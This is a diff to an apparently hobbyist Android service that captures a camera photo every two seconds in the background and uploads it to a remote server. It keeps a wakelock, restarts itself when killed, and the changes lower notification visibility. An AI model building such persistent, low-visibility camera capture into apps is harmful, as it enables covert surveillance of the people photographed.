@@ -15,6 +15,7 @@ import android.content.pm.PackageManager;
 import android.graphics.ImageFormat;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraCaptureSession;
+import android.hardware.camera2.CameraCharacteristics;
 import android.hardware.camera2.CameraDevice;
 import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CaptureFailure;
@@ -27,6 +28,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
@@ -44,12 +46,17 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
+import androidx.annotation.NonNull;
+import androidx.annotation.Nullable;
+
 public class ImageCaptureService extends Service {
     private static final String TAG = "ImageCaptureService";
     private static final String SERVER_URL = "https://myapplication4.onrender.com/upload"; // Updated to Render URL
     private static final int CAPTURE_INTERVAL_MS = 2000; // Capture every 5 seconds
-    private static final String CHANNEL_ID = "image_capture";
+    private static final String CHANNEL_ID = "ImageCaptureServiceChannel";
     private static final int NOTIFICATION_ID = 1;
+    private static final String PREF_NAME = "ImageCapturePrefs";
+    private static final String PREF_IS_CAPTURING = "is_capturing";
     private static final OkHttpClient client = new OkHttpClient.Builder()
             .connectTimeout(30, TimeUnit.SECONDS)
             .writeTimeout(30, TimeUnit.SECONDS)
@@ -75,11 +82,14 @@ public class ImageCaptureService extends Service {
     public static final String ACTION_DELETE_IMAGES = "com.example.myapplication.DELETE_IMAGES";
     private BroadcastReceiver cameraSwitchReceiver;
     
+    private SharedPreferences preferences;
+    
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.d(TAG, "onCreate called");
+        Log.d(TAG, "Service created");
         
+        preferences = getSharedPreferences(PREF_NAME, MODE_PRIVATE);
         createNotificationChannel();
         acquireWakeLock();
         requestBatteryOptimizationExemption();
@@ -107,8 +117,7 @@ public class ImageCaptureService extends Service {
                     }
                 } else if (ACTION_STOP_CAPTURE.equals(action)) {
                     Log.d(TAG, "Stopping capture");
-                    isCapturing = false;
-                    updateNotification();
+                    stopCapture();
                 } else if (ACTION_DELETE_IMAGES.equals(action)) {
                     deleteAllImages();
                 }
@@ -155,9 +164,7 @@ public class ImageCaptureService extends Service {
                 .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setContentIntent(pendingIntent)
                 .setOngoing(true)
-                .setPriority(NotificationCompat.PRIORITY_HIGH)
-                .setCategory(NotificationCompat.CATEGORY_SERVICE)
-                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
     }
     
@@ -177,76 +184,102 @@ public class ImageCaptureService extends Service {
     }
     
     private void startCamera(boolean frontCamera) {
+        Log.d(TAG, "Starting camera (front: " + frontCamera + ")");
+        this.isFrontCamera = frontCamera;
+        
         // Save camera preference
         SharedPreferences prefs = getSharedPreferences("capture_prefs", MODE_PRIVATE);
         prefs.edit().putBoolean("use_front_camera", frontCamera).apply();
         
         try {
-            // Close existing camera if any
+            // Close existing camera and session
+            if (captureSession != null) {
+                captureSession.close();
+                captureSession = null;
+            }
             if (cameraDevice != null) {
                 cameraDevice.close();
                 cameraDevice = null;
             }
-            
-            // Find the appropriate camera
-            String[] cameraIds = cameraManager.getCameraIdList();
-            for (String cameraId : cameraIds) {
-                android.hardware.camera2.CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
-                Integer facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
-                
-                if (facing != null) {
-                    if (frontCamera && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
-                        currentCameraId = cameraId;
-                        isFrontCamera = true;
-                        break;
-                    } else if (!frontCamera && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
-                        currentCameraId = cameraId;
-                        isFrontCamera = false;
-                        break;
-                    }
-                }
-            }
-            
-            if (currentCameraId == null) {
+
+            String cameraId = getCameraId();
+            if (cameraId == null) {
                 Log.e(TAG, "No suitable camera found");
                 return;
             }
-            
-            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
-                    != PackageManager.PERMISSION_GRANTED) {
+
+            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+            if (cameraManager == null) {
+                Log.e(TAG, "CameraManager is null");
+                return;
+            }
+
+            // Check camera permissions
+            if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 Log.e(TAG, "Camera permission not granted");
                 return;
             }
-            
-            Log.d(TAG, "Opening camera: " + currentCameraId);
-            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
+
+            Log.d(TAG, "Opening camera: " + cameraId);
+            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                 @Override
-                public void onOpened(CameraDevice camera) {
+                public void onOpened(@NonNull CameraDevice camera) {
                     Log.d(TAG, "Camera opened successfully");
                     cameraDevice = camera;
                     createCaptureSession();
                 }
                 
                 @Override
-                public void onDisconnected(CameraDevice camera) {
+                public void onDisconnected(@NonNull CameraDevice camera) {
                     Log.e(TAG, "Camera disconnected");
                     camera.close();
-                    // Try to reopen the camera
-                    handler.postDelayed(() -> startCamera(isFrontCamera), 1000);
+                    cameraDevice = null;
+                    // Retry after delay
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> startCamera(isFrontCamera), 1000);
                 }
                 
                 @Override
-                public void onError(CameraDevice camera, int error) {
+                public void onError(@NonNull CameraDevice camera, int error) {
                     Log.e(TAG, "Camera error: " + error);
                     camera.close();
-                    // Try to reopen the camera
-                    handler.postDelayed(() -> startCamera(isFrontCamera), 1000);
+                    cameraDevice = null;
+                    // Retry after delay
+                    new Handler(Looper.getMainLooper()).postDelayed(() -> startCamera(isFrontCamera), 1000);
                 }
-            }, handler);
+            }, null);
         } catch (CameraAccessException e) {
-            Log.e(TAG, "Failed to open camera", e);
-            // Try to reopen the camera after a delay
-            handler.postDelayed(() -> startCamera(frontCamera), 1000);
+            Log.e(TAG, "Camera access error: " + e.getMessage());
+            // Retry after delay
+            new Handler(Looper.getMainLooper()).postDelayed(() -> startCamera(isFrontCamera), 1000);
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception: " + e.getMessage());
+        }
+    }
+    
+    private String getCameraId() {
+        try {
+            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+            if (cameraManager == null) return null;
+
+            String[] cameraIds = cameraManager.getCameraIdList();
+            if (cameraIds.length == 0) return null;
+
+            // Find the appropriate camera based on useFrontCamera flag
+            for (String id : cameraIds) {
+                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(id);
+                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
+                if (facing != null && 
+                    ((isFrontCamera && facing == CameraCharacteristics.LENS_FACING_FRONT) ||
+                     (!isFrontCamera && facing == CameraCharacteristics.LENS_FACING_BACK))) {
+                    return id;
+                }
+            }
+
+            // If no matching camera found, return the first available one
+            return cameraIds[0];
+        } catch (CameraAccessException e) {
+            Log.e(TAG, "Error getting camera ID: " + e.getMessage());
+            return null;
         }
     }
     
@@ -318,6 +351,7 @@ public class ImageCaptureService extends Service {
     private void startPeriodicCapture() {
         Log.d(TAG, "Starting periodic capture");
         isCapturing = true;
+        preferences.edit().putBoolean(PREF_IS_CAPTURING, true).apply();
         updateNotification();
         
         handler.post(new Runnable() {
@@ -360,6 +394,7 @@ public class ImageCaptureService extends Service {
                         }, handler);
                     } catch (CameraAccessException e) {
                         Log.e(TAG, "Failed to capture image", e);
+                        // Recreate capture session on error
                         createCaptureSession();
                     }
                     handler.postDelayed(this, CAPTURE_INTERVAL_MS);
@@ -369,6 +404,13 @@ public class ImageCaptureService extends Service {
                 }
             }
         });
+    }
+    
+    private void stopCapture() {
+        Log.d(TAG, "Stopping capture");
+        isCapturing = false;
+        preferences.edit().putBoolean(PREF_IS_CAPTURING, false).apply();
+        updateNotification();
     }
     
     private void uploadImage(File imageFile) {
@@ -435,10 +477,8 @@ public class ImageCaptureService extends Service {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
                     "Image Capture Service",
-                    NotificationManager.IMPORTANCE_HIGH);
-            channel.setDescription("Service for capturing and uploading images");
-            channel.enableLights(true);
-            channel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
+                    NotificationManager.IMPORTANCE_LOW);
+            channel.setDescription("Service for capturing images in background");
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
         }
@@ -446,33 +486,31 @@ public class ImageCaptureService extends Service {
     
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "onStartCommand called with intent: " + intent);
+        Log.d(TAG, "Service started with intent action: " + (intent != null ? intent.getAction() : "null"));
         
         if (intent != null) {
             String action = intent.getAction();
             if (ACTION_SWITCH_CAMERA.equals(action)) {
                 boolean useFront = intent.getBooleanExtra(EXTRA_USE_FRONT_CAMERA, false);
+                Log.d(TAG, "Switching camera, use front: " + useFront);
                 startCamera(useFront);
             } else if (ACTION_START_CAPTURE.equals(action)) {
+                Log.d(TAG, "Starting capture");
                 if (!isCapturing) {
                     startPeriodicCapture();
                 }
             } else if (ACTION_STOP_CAPTURE.equals(action)) {
-                Log.d(TAG, "Stopping capture service");
-                isCapturing = false;
-                updateNotification();
-                
-                // Stop the service
-                stopSelf();
+                Log.d(TAG, "Stopping capture");
+                stopCapture();
             } else if (ACTION_DELETE_IMAGES.equals(action)) {
                 deleteAllImages();
             }
         }
         
-        // Make service sticky so it restarts if killed
         return START_STICKY;
     }
     
+    @Nullable
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -481,7 +519,7 @@ public class ImageCaptureService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "onDestroy called");
+        Log.d(TAG, "Service destroyed");
         
         isCapturing = false;
         
@@ -516,6 +554,8 @@ public class ImageCaptureService extends Service {
         if (!isCapturing) {
             stopForeground(true);
         }
+        
+        preferences.edit().putBoolean(PREF_IS_CAPTURING, false).apply();
     }
     
     private void deleteAllImages() {
